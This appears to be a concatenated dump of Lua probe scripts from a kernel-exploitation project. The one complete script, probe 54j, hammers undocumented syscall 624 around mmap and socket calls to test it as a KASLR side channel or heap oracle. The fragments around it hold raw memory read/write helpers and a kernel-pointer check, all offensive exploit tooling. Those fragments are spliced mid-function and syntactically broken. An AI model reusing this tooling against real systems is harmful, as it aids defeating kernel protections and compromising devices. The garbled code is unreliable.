local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function signed32(v)
    if type(v) == "table" and v.h then
        if v.h == 0xFFFFFFFF then return v.l - 0x100000000 end
        if v.h == 0 and v.l >= 0x80000000 then return v.l - 0x100000000 end

}

end)
```

## probes/phase14_final_push/54j_sys624_oracle.lua

```lua
-- CRASH_CLASS: LOW
-- PROBE 54j: Sys 624 counter/oracle investigation
--
-- Context: sys 624 returned 0xD31 in 51a and 0xD30 in 51b — delta of 1
-- across two separate processes. If this is a live counter, it might be
-- useful as a KASLR side channel or heap state oracle.

print("=== PROBE 54j: SYS 624 COUNTER ORACLE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function signed32(v)
    if type(v) == "table" and v.h then
        if v.h == 0xFFFFFFFF then return v.l - 0x100000000 end
        if v.h == 0 and v.l >= 0x80000000 then return v.l - 0x100000000 end
    end
    local n = to_num(v)
    if n >= 0x80000000 and n < 0x100000000 then return n - 0x100000000 end
    return n
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function hexval(val)
    if val == nil then return "nil" end
    if type(val) == "table" and val.h then
        return string.format("0x%08X_%08X", val.h, val.l)
    end
    return string.format("0x%X", to_num(val))
end

local sc624 = make_syscall(624)
local sc477 = make_syscall(477) -- mmap
local sc97  = make_syscall(97)  -- socket
local sc6   = make_syscall(6)   -- close

-- Phase 1: Rapid repeated calls — does the counter change within one process?
print("[*] Phase 1: Rapid repeated calls (20x)")
print("")
local vals = {}
for i = 1, 20 do
    local ok, ret = pcall(function()
        return sc624(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0))
    end)
    if ok then
        local rv = signed32(ret)
        vals[i] = rv
        print(string.format("  call %2d: ret=%d (0x%X)", i, rv, rv >= 0 and rv or rv + 0x100000000))
    else
        print(string.format("  call %2d: CRASHED: %s", i, tostring(ret)))
        vals[i] = nil
    end
end
print("")

-- Check if monotonic
local increasing = true
local decreasing = true
local constant = true
for i = 2, #vals do
    if vals[i] and vals[i-1] then
        if vals[i] ~= vals[i-1] then constant = false end
        if vals[i] <= vals[i-1] then increasing = false end
        if vals[i] >= vals[i-1] then decreasing = false end
    end
end
print(string.format("  Pattern: constant=%s increasing=%s decreasing=%s",
    tostring(constant), tostring(increasing), tostring(decreasing)))
print("")

-- Phase 2: Call 624 before/after operations to see what changes it
print("[*] Phase 2: Call before/after mmap allocations")
print("")
local before = nil
do
    local ok, ret = pcall(function()
        return sc624(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0))
    end)
    if ok then before = signed32(ret) end
end

-- Do 10 mmap allocations
for i = 1, 10 do
    pcall(function()
        return sc477(uint64(0), uint64(0x4000), uint64(3), uint64(0x1002),
            uint64(0xFFFFFFFF), uint64(0))
    end)
end

local after = nil
do
    local ok, ret = pcall(function()
        return sc624(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0))
    end)
    if ok then after = signed32(ret) end
end
print(string.format("  Before 10 mmaps: %s", before and tostring(before) or "failed"))
print(string.format("  After 10 mmaps:  %s", after and tostring(after) or "failed"))
if before and after then
    print(string.format("  Delta: %d", after - before))
end
print("")

-- Phase 3: Before/after socket creation
print("[*] Phase 3: Call before/after socket creation")
print("")
before = nil
do
    local ok, ret = pcall(function()
        return sc624(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0))
    end)
    if ok then before = signed32(ret) end
end

local fds = {}
for i = 1, 5 do
    local ok, ret = pcall(function()
        return sc97(uint64(2), uint64(1), uint64(0), uint64(0), uint64(0), uint64(0))
    end)
    if ok then
        local fd = signed32(ret)
        if fd >= 0 then fds[#fds+1] = fd end
    end
end

after = nil
do
    local ok, ret = pcall(function()
        return sc624(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0))
    end)
    if ok then after = signed32(ret) end
end
print(string.format("  Before 5 sockets: %s", before and tostring(before) or "failed"))
print(string.format("  After 5 sockets:  %s", after and tostring(after) or "failed"))
if before and after then
    print(string.format("  Delta: %d", after - before))
end
-- Clean up
for _, fd in ipairs(fds) do
    pcall(function() sc6(uint64(fd), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)) end)
end
print("")

-- Phase 4: Try different arg patterns
print("[*] Phase 4: Different arg0 values")
print("")
for _, arg0 in ipairs({0, 1, 2, 3, 4, 0xFF, 0x100, 0xFFFF}) do
    local ok, ret = pcall(function()
        return sc624(uint64(arg0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0))
    end)
    if ok then
        print(string.format("  624(0x%X) = %d", arg0, signed32(ret)))
    else
        print(string.format("  624(0x%X) CRASHED: %s", arg0, tostring(ret)))
    end
end
print("")

-- Phase 5: Try with output buffer
print("[*] Phase 5: With output buffer as arg2")
print("")
local outbuf = memory.alloc(256)
for _, arg0 in ipairs({0, 1}) do
    for i = 0, 63, 4 do safe_wd(outbuf + i, 0) end
    local ok, ret = pcall(function()
        return sc624(uint64(arg0), uint64(outbuf), uint64(64), uint64(0), uint64(0), uint64(0))
    end)
    if ok then
        local rv = signed32(ret)
        print(string.format("  624(%d, outbuf, 64) = %d", arg0, rv))
    else
        print(string.format("  624(%d, outbuf, 64) CRASHED: %s", arg0, tostring(ret)))
    end
end

print("")
print("=== PROBE 54j COMPLETE ===")
```

```lua
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end

    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function signed32(v)
    if type(v) == "table" and v.h then
        if v.h == 0xFFFFFFFF then return v.l - 0x100000000 end
        if v.h == 0 and v.l >= 0x80000000 then return v.l - 0x100000000 end
    end
    local n = to_num(v)
    if n >= 0x80000000 and n < 0x100000000 then return n - 0x100000000 end
    return n
end
local function is_kptr(val)
    if val == nil then return false end
    local h, l = get_hi_lo(val)

local sc626 = make_syscall(626)

-- ============================================================

                m, hexval(q0), hexval(q1), hexval(q2), hexval(q3)))

            end
```
